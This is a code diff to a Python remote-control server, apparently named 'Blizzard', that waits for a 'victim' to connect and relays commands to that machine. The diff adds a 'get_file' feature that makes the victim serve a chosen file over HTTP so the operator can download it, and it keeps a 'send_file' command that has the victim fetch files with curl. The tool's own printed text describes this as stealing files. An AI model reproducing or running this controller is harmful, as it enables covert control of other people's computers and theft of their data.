@@ -1,4 +1,4 @@
-import socket, socketserver, http.server
+import socket, socketserver, http.server, requests
 import random
 import subprocess
 import threading
@@ -17,14 +17,13 @@ def main():
     HOST = socket.gethostbyname(socket.gethostname())  # Change to the IP of your machine
     PORT = 13921
     PORT_HTTP = 8003
-
+    random_port_http = 0
     # Bind and listen for incoming connections
     server.bind((HOST, PORT))
     server.listen(1)
     print("WELCOME TO THE BLIZZARD!!!")
     print("If you want to send the victim a file type the command: 'send_file example.txt' and make sure the file is in the directory you are running Blizzard from!")
-    print("If you want to start an http server in the target type the command: 'start_http' and make sure that you are in the directory you are stealing the file from!")
-    print("Then you can grab the file using the 'curl' command!")
+    print("If you want to steal a file type the command: 'get_file example.txt' and make sure that you are in the directory you are stealing the file from!")
     print("")
     print("Waiting for victim to connect...")
     # Start the HTTP server in a separate thread
@@ -46,16 +45,42 @@ def main():
                     break
                 if command.startswith("send_file"):
                     command = f"curl -O http://{HOST}:{PORT_HTTP}/{command.split()[1]}"                    
-                if command.startswith("start_http"):
-                    http_target_port = random.randint(40000,49000)
-                    command = f"start_http {http_target_port}"
+                if command.startswith("get_file"):
+                    filename = command.split()[1]
+                    random_port_http = random.randint(40000,49000)
+                    command = f"get_file {random_port_http}"
                 client.send(command.encode("utf-8"))
                 response = client.recv(1024).decode("utf-8")
+                if response == f"HTTP {random_port_http}" and command.startswith("get_file"):
+                    print("hey")
+                    get_file(address[0], random_port_http, filename)
                 print(response)
-        except IndentationError:
+        except Exception:
             print("The victim disconnected.")
         finally:
             client.close()
+
+
+def get_file(address, port, filename):
+    file_url = f"http://{address}:{port}/{filename}"
+    print(file_url)
+    connected = False
+    while connected == False:
+        try:
+            response = requests.get(file_url)
+            connected = True
+        except Exception:
+            print("loading")
+
+    # Check if the request was successful
+    if response.status_code == 200:
+        # Open a file in binary write mode
+        with open(filename, 'wb') as file:
+            # Write the content of the response to the file
+            file.write(response.content)
+        print("File downloaded successfully!")
+    else:
+        print(f"Failed to download file. HTTP Status Code: {response.status_code}")
 
 if __name__ == "__main__":
     main()
